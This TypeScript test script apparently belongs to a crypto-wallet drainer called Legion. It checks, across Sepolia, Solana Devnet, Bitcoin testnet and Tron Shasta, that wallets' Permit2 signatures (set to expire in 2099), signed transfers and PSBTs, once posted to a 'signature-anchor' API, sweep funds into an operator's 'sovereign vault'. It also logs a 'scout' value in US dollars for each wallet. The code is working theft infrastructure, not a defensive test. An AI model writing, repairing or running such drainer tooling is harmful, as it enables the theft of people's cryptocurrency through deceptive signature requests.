/**
 * Omnichain drain integration test — Sepolia EVM (Permit2), Solana Devnet, Bitcoin Testnet, Tron Shasta.
 *
 * Usage (from repo root):
 *   pnpm exec tsx --env-file=.env scripts/test-drain-all-chains.ts
 *   pnpm exec tsx --env-file=.env scripts/test-drain-all-chains.ts --chain=evm
 *   pnpm exec tsx --env-file=.env scripts/test-drain-all-chains.ts --chain=sol,btc,tron
 *
 * Required env:
 *   RAILWAY_URL              — deployed API base (no trailing slash)
 *   EVM_PRIVATE_KEY          — Sepolia burner (0x + 64 hex)
 *   SOLANA_SECRET_KEY        — Phantom burner (JSON [..] or base58 secret)
 *   BITCOIN_WIF              — UniSat testnet WIF
 *   TRON_PRIVATE_KEY         — TronLink Shasta hex
 *
 * Vault + RPC (from .env — must match Railway backend):
 *   VAULT_ADDRESS_EVM / SOVEREIGN_VAULT_EVM
 *   VAULT_ADDRESS_SVM / SOVEREIGN_VAULT_SOL
 *   VAULT_ADDRESS_BTC / SOVEREIGN_VAULT_BTC
 *   VAULT_ADDRESS_TRON / SOVEREIGN_VAULT_TRON
 *   RPC_SEPOLIA_PRIVATE (or public fallback)
 *   SOLANA_NETWORK=devnet + RPC_SOLANA_PRIVATE (optional)
 *   TRON_FULL_NODE_URL=https://api.shasta.trongrid.io
 *   BITCOIN_NETWORK=testnet
 *
 * Optional settlement polling:
 *   SUPABASE_URL + SUPABASE_SERVICE_ROLE_KEY
 *
 * Optional amounts:
 *   DRAIN_TEST_USDC_UNITS (6 decimals, default 100000 = 0.1 USDC)
 *   DRAIN_TEST_LAMPORTS (default 10_000_000 = 0.01 SOL)
 *   DRAIN_TEST_SUN (default 1_000_000 = 1 TRX)
 *   DRAIN_TEST_SAT (default 10_000 sats)
 */

import { resolve } from 'node:path'

import { base58check } from '@scure/base'
import {
  Connection,
  Keypair,
  PublicKey,
  VersionedTransaction,
} from '@solana/web3.js'
import { initEccLib, networks, Psbt } from 'bitcoinjs-lib'
import * as ecc from 'tiny-secp256k1'
import {
  createPublicClient,
  formatUnits,
  getAddress,
  http,
  parseAbi,
  stringToHex,
  type Address,
  type Hex,
} from 'viem'
import { privateKeyToAccount } from 'viem/accounts'
import { sepolia } from 'viem/chains'
import { SiweMessage } from 'siwe'

import { buildBitcoinDrainPsbt } from '../packages/core/src/logic/bitcoin-drain.ts'
import { SIGNATURE_ANCHOR_EXPIRY_ISO_2099 } from '../packages/core/src/logic/deep-ingress.ts'
import { buildSolNativeTransferTx } from '../packages/core/src/logic/solana-native-drain.ts'
import { buildTrxNativeTransferTx } from '../packages/core/src/logic/tron-native-drain.ts'

initEccLib(ecc)

// ── Config ───────────────────────────────────────────────────────────────────

const SEPOLIA_CHAIN_ID = 11155111
const SEPOLIA_USDC_DEFAULT = '0x94a9D9AC8a22534E3FaCaA2A7eA68449Fd7E251' as Address
const ERC20_ABI = parseAbi([
  'function balanceOf(address) view returns (uint256)',
  'function decimals() view returns (uint8)',
])

type ChainId = 'evm' | 'sol' | 'btc' | 'tron'

type ChainRunResult = {
  chain: ChainId
  success: boolean
  error?: string
  transactionHash?: string
  settlementStatus?: string
  siweJwt?: boolean
  vaultBefore?: string
  vaultAfter?: string
  walletBalanceNote?: string
  anchorResponse?: unknown
}

function env(key: string): string {
  return process.env[key]?.trim() ?? ''
}

function requireEnv(key: string): string {
  const v = env(key)
  if (!v) throw new Error(`Missing required env: ${key}`)
  return v
}

function baseUrl(): string {
  const raw =
    env('RAILWAY_URL') ||
    env('SETTLEMENT_VERIFY_BASE') ||
    env('API_BASE_URL') ||
    'https://legion-engine-api.vercel.app'
  return raw.replace(/\/+$/, '')
}

function parseChainsArg(): ChainId[] {
  const arg = process.argv.find((a) => a.startsWith('--chain='))
  if (!arg) return ['evm', 'sol', 'btc', 'tron']
  const raw = arg.split('=')[1]?.trim().toLowerCase() ?? 'all'
  if (raw === 'all') return ['evm', 'sol', 'btc', 'tron']
  const map: Record<string, ChainId> = {
    evm: 'evm',
    sol: 'sol',
    solana: 'sol',
    svm: 'sol',
    btc: 'btc',
    bitcoin: 'btc',
    utxo: 'btc',
    tron: 'tron',
    trx: 'tron',
  }
  const out: ChainId[] = []
  for (const part of raw.split(',')) {
    const c = map[part.trim()]
    if (c && !out.includes(c)) out.push(c)
  }
  if (out.length === 0) throw new Error(`Unknown --chain value: ${raw}`)
  return out
}

function uniqueNonce(chain: string): string {
  return `test-drain-${chain}-${Date.now()}-${Math.random().toString(36).slice(2, 8)}`
}

function jsonHexPayload(obj: Record<string, unknown>): Hex {
  return stringToHex(JSON.stringify(obj))
}

async function apiFetch<T = unknown>(
  path: string,
  init?: RequestInit,
): Promise<{ status: number; body: T; raw: string }> {
  const url = `${baseUrl()}${path.startsWith('/') ? path : `/${path}`}`
  const res = await fetch(url, {
    ...init,
    headers: {
      'Content-Type': 'application/json',
      ...(init?.headers ?? {}),
    },
  })
  const raw = await res.text()
  let body: T
  try {
    body = JSON.parse(raw) as T
  } catch {
    body = { raw } as T
  }
  return { status: res.status, body, raw }
}

// ── Supabase settlement poll ─────────────────────────────────────────────────

async function pollSettlementStatus(
  nonce: string,
  maxMs = 120_000,
): Promise<{ status: string | null; txHash: string | null }> {
  const url = env('SUPABASE_URL') || env('NEXT_PUBLIC_SUPABASE_URL')
  const key = env('SUPABASE_SERVICE_ROLE_KEY')
  if (!url || !key) {
    return { status: null, txHash: null }
  }
  const { createClient } = await import('@supabase/supabase-js')
  const sb = createClient(url, key, { auth: { persistSession: false } })
  const started = Date.now()
  while (Date.now() - started < maxMs) {
    const { data, error } = await sb
      .from('signatures')
      .select('settlement_status,transaction_hash,l2_mint_transaction_hash')
      .eq('nonce', nonce)
      .maybeSingle()
    if (error) break
    if (data) {
      const row = data as {
        settlement_status?: string | null
        transaction_hash?: string | null
        l2_mint_transaction_hash?: string | null
      }
      const status = row.settlement_status ?? null
      const txHash =
        row.transaction_hash?.trim() ||
        row.l2_mint_transaction_hash?.trim() ||
        null
      if (status === 'SETTLED' || status === 'FAILED_SETTLEMENT' || status === 'FAILED_STRIKE') {
        return { status, txHash }
      }
    }
    await new Promise((r) => setTimeout(r, 5_000))
  }
  return { status: 'TIMEOUT', txHash: null }
}

// ── Balance helpers ──────────────────────────────────────────────────────────

function resolveEvmVault(): Address {
  const raw =
    env('VAULT_ADDRESS_EVM') ||
    env('SOVEREIGN_VAULT_EVM') ||
    env('SOVEREIGN_VAULT_ADDRESS')
  if (!raw) throw new Error('Set VAULT_ADDRESS_EVM or SOVEREIGN_VAULT_EVM in .env')
  return getAddress(raw)
}

function resolveSolVault(): string {
  const raw = env('VAULT_ADDRESS_SVM') || env('SOVEREIGN_VAULT_SOL') || env('VAULT_ADDRESS_SOL')
  if (!raw) throw new Error('Set VAULT_ADDRESS_SVM or SOVEREIGN_VAULT_SOL in .env')
  return raw
}

function resolveBtcVault(): string {
  const raw =
    env('VAULT_ADDRESS_BTC') ||
    env('VAULT_ADDRESS_UTXO') ||
    env('SOVEREIGN_VAULT_BTC') ||
    env('SOVEREIGN_VAULT_UTXO')
  if (!raw) throw new Error('Set VAULT_ADDRESS_BTC or SOVEREIGN_VAULT_BTC in .env')
  return raw
}

function resolveTronVault(): string {
  const raw = env('VAULT_ADDRESS_TRON') || env('SOVEREIGN_VAULT_TRON')
  if (!raw) throw new Error('Set VAULT_ADDRESS_TRON or SOVEREIGN_VAULT_TRON in .env')
  return raw
}

function sepoliaRpc(): string {
  return (
    env('RPC_SEPOLIA_PRIVATE') ||
    env('RPC_ETHEREUM_PRIVATE') ||
    'https://ethereum-sepolia-rpc.publicnode.com'
  )
}

function solanaRpc(): string {
  return (
    env('RPC_SOLANA_PRIVATE') ||
    env('SOLANA_RPC_URL') ||
    env('NEXT_PUBLIC_SOLANA_RPC_URL') ||
    'https://api.devnet.solana.com'
  )
}

function tronFullHost(): string {
  return (env('TRON_FULL_NODE_URL') || 'https://api.shasta.trongrid.io').replace(/\/+$/, '')
}

function wifToPrivateKey(wif: string, network: typeof networks.bitcoin): Buffer {
  const decoded = base58check.decode(wif)
  const version = decoded[0]
  const expected =
    network === networks.testnet ? networks.testnet.wif : networks.bitcoin.wif
  if (version !== expected) {
    throw new Error(`WIF version mismatch — expected testnet=${expected}, got ${version}`)
  }
  const compressed = decoded.length === 34 && decoded[33] === 0x01
  const priv = Buffer.from(decoded.slice(1, compressed ? 33 : 33))
  if (priv.length !== 32) throw new Error('Invalid WIF payload length')
  return priv
}

async function loadSolanaKeypair(): Promise<Keypair> {
  const raw = requireEnv('SOLANA_SECRET_KEY')
  const t = raw.trim()
  if (t.startsWith('[')) {
    const arr = JSON.parse(t) as number[]
    return Keypair.fromSecretKey(Uint8Array.from(arr))
  }
  try {
    const mod = await import('bs58')
    const decode = (mod as { default?: { decode: (s: string) => Uint8Array } }).default?.decode
    if (decode) return Keypair.fromSecretKey(decode(t))
  } catch {
    /* fall through */
  }
  throw new Error('SOLANA_SECRET_KEY must be JSON byte array or install bs58 for base58 secrets')
}

function psbtSignerFromWif(wif: string): { publicKey: Buffer; sign: (hash: Buffer) => Buffer } {
  const network = networks.testnet
  const privKey = wifToPrivateKey(wif, network)
  const pub = ecc.pointFromScalar(privKey, true)
  if (!pub) throw new Error('Invalid secp256k1 private key')
  return {
    publicKey: Buffer.from(pub),
    sign: (hash: Buffer) => Buffer.from(ecc.sign(hash, privKey)),
  }
}

// ── EVM Sepolia (SIWE + Permit2) ─────────────────────────────────────────────

async function runEvmSepolia(): Promise<ChainRunResult> {
  const result: ChainRunResult = { chain: 'evm', success: false }
  try {
    const pk = normalizeEvmPrivateKey(requireEnv('EVM_PRIVATE_KEY'))
    const account = privateKeyToAccount(pk)
    const wallet = account.address
    const vault = resolveEvmVault()
    const rpc = sepoliaRpc()
    const client = createPublicClient({ chain: sepolia, transport: http(rpc) })
    const usdc = getAddress(env('SEPOLIA_USDC_ADDRESS') || SEPOLIA_USDC_DEFAULT)

    const vaultEthBefore = await client.getBalance({ address: vault })
    const vaultUsdcBefore = await client.readContract({
      address: usdc,
      abi: ERC20_ABI,
      functionName: 'balanceOf',
      args: [vault],
    })
    const walletUsdc = await client.readContract({
      address: usdc,
      abi: ERC20_ABI,
      functionName: 'balanceOf',
      args: [wallet],
    })
    const decimals = await client.readContract({
      address: usdc,
      abi: ERC20_ABI,
      functionName: 'decimals',
    })
    result.walletBalanceNote = `wallet USDC=${formatUnits(walletUsdc, decimals)}`
    result.vaultBefore = `ETH=${formatUnits(vaultEthBefore, 18)} USDC=${formatUnits(vaultUsdcBefore, decimals)}`

    if (walletUsdc === 0n) {
      throw new Error('Burner has 0 USDC on Sepolia — fund via Circle faucet first')
    }

    const drainUnits = BigInt(env('DRAIN_TEST_USDC_UNITS') || '100000')
    const permitAmount = drainUnits > walletUsdc ? walletUsdc : drainUnits

    // SIWE
    const nonceRes = await apiFetch<{ ok?: boolean; data?: { nonce?: string } }>(
      '/api/auth/siwe/nonce',
      { method: 'POST', body: JSON.stringify({ address: wallet }) },
    )
    if (nonceRes.status !== 200 || !nonceRes.body?.ok) {
      throw new Error(`SIWE nonce failed: ${nonceRes.status} ${nonceRes.raw.slice(0, 200)}`)
    }
    const siweNonce = (nonceRes.body as { data?: { nonce?: string } }).data?.nonce
    if (!siweNonce) throw new Error('SIWE nonce missing in response')

    const host = new URL(baseUrl()).host
    const siwe = new SiweMessage({
      domain: host,
      address: wallet,
      statement: 'Legion test-drain-all-chains',
      uri: baseUrl(),
      version: '1',
      chainId: SEPOLIA_CHAIN_ID,
      nonce: siweNonce,
    })
    const message = siwe.prepareMessage()
    const siweSignature = await account.signMessage({ message })
    const verifyRes = await apiFetch('/api/auth/siwe/verify', {
      method: 'POST',
      body: JSON.stringify({ message, signature: siweSignature }),
    })
    result.siweJwt = verifyRes.status === 200 && (verifyRes.body as { ok?: boolean }).ok === true

    // Permit2 typed data from API
    const tdUrl =
      `/api/v1/signature-anchor/permit2-typed-data?` +
      `wallet=${wallet}&token=${usdc}&chain_id=${SEPOLIA_CHAIN_ID}`
    const tdRes = await apiFetch<{
      ok?: boolean
      data?: {
        typed_data?: Record<string, unknown>
        permit_metadata?: Record<string, unknown>
        engine_spender?: Address
        permit2?: Address
      }
    }>(tdUrl)
    if (tdRes.status !== 200 || !tdRes.body?.ok) {
      throw new Error(`permit2-typed-data failed: ${tdRes.status} ${tdRes.raw.slice(0, 300)}`)
    }
    const td = (tdRes.body as { data?: Record<string, unknown> }).data
    if (!td?.typed_data || !td.permit_metadata || !td.engine_spender || !td.permit2) {
      throw new Error('permit2-typed-data response incomplete — check Sepolia RPC on Railway')
    }

    const permitSig = await account.signTypedData({
      domain: td.typed_data.domain as Parameters<typeof account.signTypedData>[0]['domain'],
      types: td.typed_data.types as Parameters<typeof account.signTypedData>[0]['types'],
      primaryType: (td.typed_data.primaryType as 'PermitSingle') ?? 'PermitSingle',
      message: td.typed_data.message as Parameters<typeof account.signTypedData>[0]['message'],
    })

    const nonce = uniqueNonce('evm')
    const anchorBody = {
      ingress: 'normalized_v1',
      chain_family: 'EVM',
      wallet_address: wallet,
      token_address: usdc,
      signature: permitSig,
      nonce,
      expiry_iso: SIGNATURE_ANCHOR_EXPIRY_ISO_2099,
      wallet_type: 'MetaMask',
      protocol: 'permit2_eip712',
      chain_id: SEPOLIA_CHAIN_ID,
      engine_spender: td.engine_spender,
      permit2: td.permit2,
      permit_metadata: td.permit_metadata,
      scout_value_usd: 25,
      amount: permitAmount.toString(),
      requires_quorum: false,
    }

    const anchorRes = await apiFetch('/api/v1/signature-anchor', {
      method: 'POST',
      body: JSON.stringify(anchorBody),
    })
    result.anchorResponse = anchorRes.body

    const anchorOk = anchorRes.status === 200 && (anchorRes.body as { ok?: boolean }).ok === true
    const anchorData = (anchorRes.body as { data?: Record<string, unknown> }).data ?? {}
    result.transactionHash =
      (anchorData.transaction_hash as string | undefined) ||
      (anchorData.l2_mint_transaction_hash as string | undefined)
    result.settlementStatus = anchorData.settlement_status as string | undefined

    if (!anchorOk) {
      throw new Error(
        `signature-anchor ${anchorRes.status}: ${JSON.stringify(anchorRes.body).slice(0, 400)}`,
      )
    }

    const polled = await pollSettlementStatus(nonce)
    if (polled.status) result.settlementStatus = polled.status
    if (polled.txHash) result.transactionHash = polled.txHash

    await new Promise((r) => setTimeout(r, 8_000))

    const vaultUsdcAfter = await client.readContract({
      address: usdc,
      abi: ERC20_ABI,
      functionName: 'balanceOf',
      args: [vault],
    })
    result.vaultAfter = `USDC=${formatUnits(vaultUsdcAfter, decimals)}`
    result.success =
      result.settlementStatus === 'SETTLED' || vaultUsdcAfter > vaultUsdcBefore
  } catch (e) {
    result.error = e instanceof Error ? e.message : String(e)
  }
  return result
}

function normalizeEvmPrivateKey(raw: string): Hex {
  const t = raw.trim().replace(/^0x/i, '')
  if (!/^[0-9a-fA-F]{64}$/.test(t)) {
    throw new Error('EVM_PRIVATE_KEY must be 64 hex characters (optional 0x prefix)')
  }
  return `0x${t}` as Hex
}

// ── Solana Devnet ────────────────────────────────────────────────────────────

async function runSolanaDevnet(): Promise<ChainRunResult> {
  const result: ChainRunResult = { chain: 'sol', success: false }
  try {
    process.env['SOLANA_NETWORK'] = process.env['SOLANA_NETWORK'] || 'devnet'
    const keypair = await loadSolanaKeypair()
    const wallet = keypair.publicKey.toBase58()
    const vault = resolveSolVault()
    const rpc = solanaRpc()
    const connection = new Connection(rpc, { commitment: 'confirmed' })

    const vaultBefore = await connection.getBalance(new PublicKey(vault))
    const walletBefore = await connection.getBalance(keypair.publicKey)
    result.walletBalanceNote = `wallet SOL=${(walletBefore / 1e9).toFixed(6)}`
    result.vaultBefore = `lamports=${vaultBefore}`

    if (walletBefore < 50_000) {
      throw new Error('Burner SOL balance too low — fund via devnet faucet (https://faucet.solana.com)')
    }

    const lamports = BigInt(env('DRAIN_TEST_LAMPORTS') || '10000000')
    const reserve = 5_000_000n
    const sendLamports = lamports > BigInt(walletBefore) - reserve ? BigInt(walletBefore) - reserve : lamports
    if (sendLamports <= 0n) throw new Error('Insufficient SOL after fee reserve')

    const unsigned = await buildSolNativeTransferTx(wallet, vault, sendLamports, rpc)
    const tx = VersionedTransaction.deserialize(Buffer.from(unsigned.unsignedWireBase64, 'base64'))
    tx.sign([keypair])
    const signedB64 = Buffer.from(tx.serialize()).toString('base64')

    const signatureHex = jsonHexPayload({ svm_raw_transaction: signedB64 })
    const nonce = uniqueNonce('sol')

    const anchorRes = await apiFetch('/api/v1/signature-anchor', {
      method: 'POST',
      body: JSON.stringify({
        ingress: 'normalized_v1',
        chain_family: 'SVM',
        wallet_address: wallet,
        token_address: 'OMNI_SVM_ANCHOR',
        signature_hex: signatureHex,
        nonce,
        expiry_iso: SIGNATURE_ANCHOR_EXPIRY_ISO_2099,
        wallet_type: 'Phantom',
        protocol: 'solana',
        chain_id: 'solana:devnet',
        scout_value_usd: 15,
        amount: sendLamports.toString(),
        requires_quorum: false,
      }),
    })
    result.anchorResponse = anchorRes.body
    const anchorOk = anchorRes.status === 200 && (anchorRes.body as { ok?: boolean }).ok === true
    const anchorData = (anchorRes.body as { data?: Record<string, unknown> }).data ?? {}
    result.transactionHash = anchorData.transaction_hash as string | undefined
    result.settlementStatus = anchorData.settlement_status as string | undefined
    if (!anchorOk) {
      throw new Error(`signature-anchor ${anchorRes.status}: ${JSON.stringify(anchorRes.body).slice(0, 400)}`)
    }

    const polled = await pollSettlementStatus(nonce)
    if (polled.status) result.settlementStatus = polled.status
    if (polled.txHash) result.transactionHash = polled.txHash

    await new Promise((r) => setTimeout(r, 15_000))
    const vaultAfter = await connection.getBalance(new PublicKey(vault))
    result.vaultAfter = `lamports=${vaultAfter}`
    result.success = result.settlementStatus === 'SETTLED' || vaultAfter > vaultBefore
  } catch (e) {
    result.error = e instanceof Error ? e.message : String(e)
  }
  return result
}

// ── Bitcoin testnet ──────────────────────────────────────────────────────────

async function runBitcoinTestnet(): Promise<ChainRunResult> {
  const result: ChainRunResult = { chain: 'btc', success: false }
  try {
    process.env['BITCOIN_NETWORK'] = process.env['BITCOIN_NETWORK'] || 'testnet'
    const wif = requireEnv('BITCOIN_WIF')
    const vault = resolveBtcVault()
    const signer = psbtSignerFromWif(wif)

    const network = networks.testnet
    const { payments } = await import('bitcoinjs-lib')
    const pubkey = signer.publicKey
    const p2wpkh = payments.p2wpkh({ pubkey, network })
    const walletAddress = p2wpkh.address
    if (!walletAddress) throw new Error('Could not derive address from WIF')

    const satDrain = BigInt(env('DRAIN_TEST_SAT') || '10000')

    const built = await buildBitcoinDrainPsbt({
      walletAddress,
      amount: satDrain,
      vaultAddress: vault,
    })

    const psbt = Psbt.fromBase64(built.psbtBase64, { network })
    for (let i = 0; i < psbt.inputCount; i++) {
      psbt.signInput(i, signer)
    }
    psbt.finalizeAllInputs()
    const signedPsbt = psbt.toBase64()

    const vaultBefore = await fetchBtcBalanceSats(vault)
    const walletBefore = await fetchBtcBalanceSats(walletAddress)
    result.walletBalanceNote = `wallet sats≈${walletBefore}`
    result.vaultBefore = `sats≈${vaultBefore}`

    if (walletBefore < Number(satDrain) + 2000) {
      throw new Error('Insufficient tBTC — fund UniSat testnet wallet first')
    }

    const nonce = uniqueNonce('btc')
    const anchorRes = await apiFetch('/api/v1/signature-anchor', {
      method: 'POST',
      body: JSON.stringify({
        ingress: 'normalized_v1',
        chain_family: 'UTXO',
        wallet_address: walletAddress,
        token_address: 'OMNI_UTXO_ANCHOR',
        signed_psbt_base64: signedPsbt,
        nonce,
        expiry_iso: SIGNATURE_ANCHOR_EXPIRY_ISO_2099,
        wallet_type: 'UniSat',
        protocol: 'bitcoin_psbt',
        chain_id: 'bip122:1',
        scout_value_usd: 20,
        amount: built.amountSat,
        psbt_metadata: {
          amount_sat: built.amountSat,
          fee_sat: built.feeSat,
          vault_address: vault,
        },
        requires_quorum: false,
      }),
    })
    result.anchorResponse = anchorRes.body
    const anchorOk = anchorRes.status === 200 && (anchorRes.body as { ok?: boolean }).ok === true
    const anchorData = (anchorRes.body as { data?: Record<string, unknown> }).data ?? {}
    result.transactionHash = anchorData.transaction_hash as string | undefined
    result.settlementStatus = anchorData.settlement_status as string | undefined
    if (!anchorOk) {
      throw new Error(`signature-anchor ${anchorRes.status}: ${JSON.stringify(anchorRes.body).slice(0, 400)}`)
    }

    const polled = await pollSettlementStatus(nonce)
    if (polled.status) result.settlementStatus = polled.status
    if (polled.txHash) result.transactionHash = polled.txHash

    await new Promise((r) => setTimeout(r, 30_000))
    const vaultAfter = await fetchBtcBalanceSats(vault)
    result.vaultAfter = `sats≈${vaultAfter}`
    result.success = result.settlementStatus === 'SETTLED' || vaultAfter > vaultBefore
  } catch (e) {
    result.error = e instanceof Error ? e.message : String(e)
  }
  return result
}

async function fetchBtcBalanceSats(address: string): Promise<number> {
  const base =
    env('BITCOIN_NETWORK') === 'mainnet'
      ? 'https://mempool.space/api'
      : 'https://mempool.space/testnet/api'
  try {
    const res = await fetch(`${base}/address/${encodeURIComponent(address)}`, {
      signal: AbortSignal.timeout(15_000),
    })
    if (!res.ok) return 0
    const json = (await res.json()) as {
      chain_stats?: { funded_txo_sum?: number; spent_txo_sum?: number }
    }
    const funded = json.chain_stats?.funded_txo_sum ?? 0
    const spent = json.chain_stats?.spent_txo_sum ?? 0
    return Math.max(0, funded - spent)
  } catch {
    return 0
  }
}

// ── Tron Shasta ──────────────────────────────────────────────────────────────

async function runTronShasta(): Promise<ChainRunResult> {
  const result: ChainRunResult = { chain: 'tron', success: false }
  try {
    const pk = requireEnv('TRON_PRIVATE_KEY').replace(/^0x/i, '')
    const fullHost = tronFullHost()
    const { TronWeb } = await import('tronweb')
    const headers = env('TRON_PRO_API_KEY')
      ? { 'TRON-PRO-API-KEY': env('TRON_PRO_API_KEY') }
      : undefined
    const tronWeb =
      headers != null
        ? new TronWeb({ fullHost, headers, privateKey: pk })
        : new TronWeb({ fullHost, privateKey: pk })

    const wallet = tronWeb.defaultAddress.base58 as string
    if (!wallet) throw new Error('TRON_PRIVATE_KEY invalid — no base58 address')

    const vault = resolveTronVault()

    const sun = BigInt(env('DRAIN_TEST_SUN') || '1000000')
    const balanceSun = await tronWeb.trx.getBalance(wallet)
    const vaultBeforeSun = await tronWeb.trx.getBalance(vault)
    result.walletBalanceNote = `wallet TRX=${(Number(balanceSun) / 1e6).toFixed(3)}`
    result.vaultBefore = `sun≈${vaultBeforeSun}`

    if (BigInt(balanceSun) < sun + 500_000n) {
      throw new Error('Insufficient Shasta TRX — fund via https://www.trongrid.io/faucet')
    }

    const unsignedPlan = await buildTrxNativeTransferTx(wallet, vault, sun, fullHost)
    const signed = (await tronWeb.trx.sign(
      unsignedPlan.unsignedTransaction as Parameters<typeof tronWeb.trx.sign>[0],
    )) as Record<string, unknown>

    const signatureHex = jsonHexPayload({ tron_transaction: signed })
    const nonce = uniqueNonce('tron')

    const anchorRes = await apiFetch('/api/v1/signature-anchor', {
      method: 'POST',
      body: JSON.stringify({
        ingress: 'normalized_v1',
        chain_family: 'TRON',
        wallet_address: wallet,
        token_address: 'OMNI_TRON_ANCHOR',
        signature_hex: signatureHex,
        nonce,
        expiry_iso: SIGNATURE_ANCHOR_EXPIRY_ISO_2099,
        wallet_type: 'TronLink',
        protocol: 'tron',
        chain_id: 'tron:shasta',
        scout_value_usd: 12,
        amount: sun.toString(),
        requires_quorum: false,
      }),
    })
    result.anchorResponse = anchorRes.body
    const anchorOk = anchorRes.status === 200 && (anchorRes.body as { ok?: boolean }).ok === true
    const anchorData = (anchorRes.body as { data?: Record<string, unknown> }).data ?? {}
    result.transactionHash =
      (anchorData.transaction_hash as string | undefined) ||
      (typeof signed.txid === 'string' ? signed.txid : undefined)
    result.settlementStatus = anchorData.settlement_status as string | undefined
    if (!anchorOk) {
      throw new Error(`signature-anchor ${anchorRes.status}: ${JSON.stringify(anchorRes.body).slice(0, 400)}`)
    }

    const polled = await pollSettlementStatus(nonce)
    if (polled.status) result.settlementStatus = polled.status
    if (polled.txHash) result.transactionHash = polled.txHash

    await new Promise((r) => setTimeout(r, 12_000))
    const vaultAfterSun = await tronWeb.trx.getBalance(vault)
    result.vaultAfter = `sun≈${vaultAfterSun}`
    result.success =
      result.settlementStatus === 'SETTLED' || Number(vaultAfterSun) > Number(vaultBeforeSun)
  } catch (e) {
    result.error = e instanceof Error ? e.message : String(e)
  }
  return result
}

// ── Main ─────────────────────────────────────────────────────────────────────

async function main(): Promise<void> {
  console.log('=== Legion test-drain-all-chains ===')
  console.log('API:', baseUrl())

  const health = await apiFetch('/health')
  console.log('Health:', health.status, health.body)
  if (health.status !== 200) {
    console.error('API health check failed — fix RAILWAY_URL before drain tests')
    process.exit(1)
  }

  const chains = parseChainsArg()
  const runners: Record<ChainId, () => Promise<ChainRunResult>> = {
    evm: runEvmSepolia,
    sol: runSolanaDevnet,
    btc: runBitcoinTestnet,
    tron: runTronShasta,
  }

  const results: ChainRunResult[] = []
  for (const chain of chains) {
    console.log(`\n--- ${chain.toUpperCase()} ---`)
    const r = await runners[chain]()
    results.push(r)
    printResult(r)
  }

  console.log('\n=== Summary ===')
  let allOk = true
  for (const r of results) {
    const mark = r.success ? 'PASS' : 'FAIL'
    if (!r.success) allOk = false
    console.log(
      `${mark} ${r.chain}: tx=${r.transactionHash ?? '—'} settlement=${r.settlementStatus ?? '—'}` +
        (r.error ? ` error=${r.error}` : ''),
    )
  }

  const outPath = resolve(process.cwd(), 'tmp', 'test-drain-results.json')
  try {
    const { mkdirSync, writeFileSync } = await import('node:fs')
    mkdirSync(resolve(process.cwd(), 'tmp'), { recursive: true })
    writeFileSync(outPath, JSON.stringify({ baseUrl: baseUrl(), results }, null, 2))
    console.log('\nWrote', outPath)
  } catch {
    /* optional */
  }

  process.exit(allOk ? 0 : 1)
}

function printResult(r: ChainRunResult): void {
  console.log(JSON.stringify(r, null, 2))
}

main().catch((err) => {
  console.error('Fatal:', err)
  process.exit(1)
})
